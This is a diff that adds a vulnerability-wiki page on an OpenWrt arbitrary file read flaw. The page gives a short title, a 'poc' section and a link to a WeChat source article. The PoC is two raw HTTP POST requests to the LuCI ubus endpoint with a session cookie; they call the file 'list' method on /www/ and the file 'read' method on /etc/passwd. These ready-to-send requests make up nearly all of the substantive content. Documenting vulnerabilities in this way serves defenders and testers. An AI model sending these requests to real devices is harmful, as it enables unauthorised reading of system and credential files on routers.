@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>OpenWrt任意文件读取 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "OpenWrt\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6", url: "#_top", children: [
+              {title: "poc", url: "#poc" },
+              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Openfire/Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%26getshell%28CVE-2023-32315%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Openfire/Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%26getshell%28CVE-2023-32315%29/" class="btn btn-xs btn-link">
+        Openfire身份认证绕过漏洞&amp;getshell(CVE-2023-32315)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../OpenSSL/heartbleed/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../OpenSSL/heartbleed/" class="btn btn-xs btn-link">
+        This page moved to CVE-2014-0160
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="openwrt">OpenWrt任意文件读取<a class="headerlink" href="#openwrt" title="Permanent link">&para;</a></h1>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">luci</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">ubus</span><span class="o">?</span><span class="mf">1733734260589</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.121.180</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">121</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">122.0.6261.95</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">json</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.121.180</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.121.180/cgi-bin/luci/</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">sysauth</span><span class="o">=</span><span class="mf">305</span><span class="nx">ade5ef36d6ced39e386729e8868b6</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+
+<span class="p">[{</span><span class="s2">&quot;jsonrpc&quot;</span><span class="o">:</span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span><span class="s2">&quot;id&quot;</span><span class="o">:</span><span class="mf">0</span><span class="p">,</span><span class="s2">&quot;method&quot;</span><span class="o">:</span><span class="s2">&quot;call&quot;</span><span class="p">,</span><span class="s2">&quot;params&quot;</span><span class="o">:</span><span class="p">[</span><span class="s2">&quot;305ade5ef36d6ced39e386729e8868b6&quot;</span><span class="p">,</span><span class="s2">&quot;file&quot;</span><span class="p">,</span><span class="s2">&quot;list&quot;</span><span class="p">,{</span><span class="s2">&quot;path&quot;</span><span class="o">:</span><span class="s2">&quot;/www/&quot;</span><span class="p">}]}]</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cgi</span><span class="o">-</span><span class="nx">bin</span><span class="o">/</span><span class="nx">luci</span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span><span class="nx">ubus</span><span class="o">?</span><span class="mf">1733734260589</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">192.168.121.180</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">127</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">122.0.6261.95</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">json</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.121.180</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//192.168.121.180/cgi-bin/luci/</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">sysauth</span><span class="o">=</span><span class="mf">305</span><span class="nx">ade5ef36d6ced39e386729e8868b6</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+
+<span class="p">[{</span><span class="s2">&quot;jsonrpc&quot;</span><span class="o">:</span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span><span class="s2">&quot;id&quot;</span><span class="o">:</span><span class="mf">0</span><span class="p">,</span><span class="s2">&quot;method&quot;</span><span class="o">:</span><span class="s2">&quot;call&quot;</span><span class="p">,</span><span class="s2">&quot;params&quot;</span><span class="o">:</span><span class="p">[</span><span class="s2">&quot;305ade5ef36d6ced39e386729e8868b6&quot;</span><span class="p">,</span><span class="s2">&quot;file&quot;</span><span class="p">,</span><span class="s2">&quot;read&quot;</span><span class="p">,{</span><span class="s2">&quot;path&quot;</span><span class="o">:</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">}]}]</span>
+</code></pre></div>
+<p><img alt="图片" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112142249.webp" /></p>
+<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/nRSmiZy5JMt-0K1sSeUexw">https://mp.weixin.qq.com/s/nRSmiZy5JMt-0K1sSeUexw</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Openfire/Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%26getshell%28CVE-2023-32315%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Openfire/Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%26getshell%28CVE-2023-32315%29/" class="btn btn-xs btn-link">
+        Openfire身份认证绕过漏洞&amp;getshell(CVE-2023-32315)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../OpenSSL/heartbleed/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../OpenSSL/heartbleed/" class="btn btn-xs btn-link">
+        This page moved to CVE-2014-0160
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
